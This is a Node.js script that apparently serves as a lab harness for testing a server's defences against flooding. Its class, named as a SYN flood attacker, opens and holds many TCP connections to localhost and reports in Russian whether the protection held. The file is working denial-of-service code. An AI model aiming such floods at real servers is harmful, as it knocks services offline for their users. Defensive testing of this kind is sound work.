const net = require('net');
const log = require('../utils/logger');

class SYNFloodAttacker {
    constructor(targetPort = 8080, targetHost = 'localhost') {
        this.targetPort = targetPort;
        this.targetHost = targetHost;
        this.connections = [];
        this.attackInterval = null;
        this.stats = {
            attempted: 0,
            successful: 0,
            rejected: 0
        };
    }
    
    startAttack(count = 100, delay = 10) {
        log.section(`ЗАПУСК SYN FLOOD АТАКИ`);
        log.attack(`Цель: ${this.targetHost}:${this.targetPort}`);
        log.attack(`Количество попыток: ${count}`);
        log.attack(`Интервал: ${delay}мс`);
        
        let attempts = 0;
        
        this.attackInterval = setInterval(() => {
            if (attempts >= count) {
                this.stopAttack();
                return;
            }
            
            this.performSynAttempt(attempts);
            attempts++;
            this.stats.attempted++;
            
        }, delay);
    }
    
    performSynAttempt(id) {
        const socket = new net.Socket();
        
        socket.connect(this.targetPort, this.targetHost, () => {
            log.attack(`[SYN ${id}] Соединение установлено, держим открытым...`);
            this.stats.successful++;
            
            this.connections.push(socket);
        });
        
        socket.on('error', (err) => {
            if (err.code === 'ECONNREFUSED') {
                log.attack(`[SYN ${id}] Соединение отклонено сервером (ЗАЩИТА СРАБОТАЛА!)`);
            } else if (err.code === 'ETIMEDOUT') {
                log.attack(`[SYN ${id}] Таймаут соединения (ЗАЩИТА СРАБОТАЛА!)`);
            } else {
                log.attack(`[SYN ${id}] Ошибка: ${err.code}`);
            }
            this.stats.rejected++;
        });
        
        socket.setTimeout(60000);
    }
    
    stopAttack() {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = null;
        }
        
        log.section('РЕЗУЛЬТАТЫ SYN FLOOD АТАКИ');
        log.attack(`Всего попыток: ${this.stats.attempted}`);
        log.attack(`Успешных соединений: ${this.stats.successful}`);
        log.attack(`Отклонено/сброшено: ${this.stats.rejected}`);
        
        if (this.stats.rejected > this.stats.successful / 2) {
            log.success('Защита сервера эффективно блокирует SYN Flood атаку!');
        } else {
            log.warn('Сервер уязвим к SYN Flood атаке!');
        }
    }
    
    closeAllConnections() {
        this.connections.forEach(socket => {
            socket.destroy();
        });
        this.connections = [];
        log.attack('Все соединения закрыты');
    }
}

if (require.main === module) {
    const attacker = new SYNFloodAttacker(8080);
    
    attacker.startAttack(50, 20); 

    setTimeout(() => {
        attacker.stopAttack();
        attacker.closeAllConnections();
    }, 7000);
    
    // Для атаки на уязвимый сервер (порт 8081):
    // const attacker2 = new SYNFloodAttacker(8081);
    // attacker2.startAttack(50, 20);
}

module.exports = SYNFloodAttacker;